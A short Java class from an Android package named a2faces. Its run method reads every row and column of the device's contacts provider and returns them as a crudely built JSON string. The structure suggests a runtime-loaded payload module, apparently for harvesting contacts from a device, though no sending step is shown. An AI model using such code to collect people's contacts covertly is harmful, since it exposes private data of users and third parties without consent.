package com.android.a2faces;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

class RuntimeClass {
    public RuntimeClass() {}

    public String run(Context context) {
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://contacts"), null, null, null, null);

        String jsonEncodedContacts = "[";
        if (cursor != null && cursor.moveToFirst() ) {
            do {
                jsonEncodedContacts += "{";
                for(int idx=0; idx < cursor.getColumnCount(); idx++){
                    jsonEncodedContacts += " \"" + cursor.getColumnName(idx) + "\":\"" + cursor.getString(idx) + "\",";
                }
                jsonEncodedContacts = jsonEncodedContacts.substring(0, jsonEncodedContacts.length() - 1);
                jsonEncodedContacts += "},";
            } while (cursor.moveToNext());
            jsonEncodedContacts = jsonEncodedContacts.substring(0, jsonEncodedContacts.length() - 1);
        }
        jsonEncodedContacts += "]";
        return  jsonEncodedContacts;
    }
}
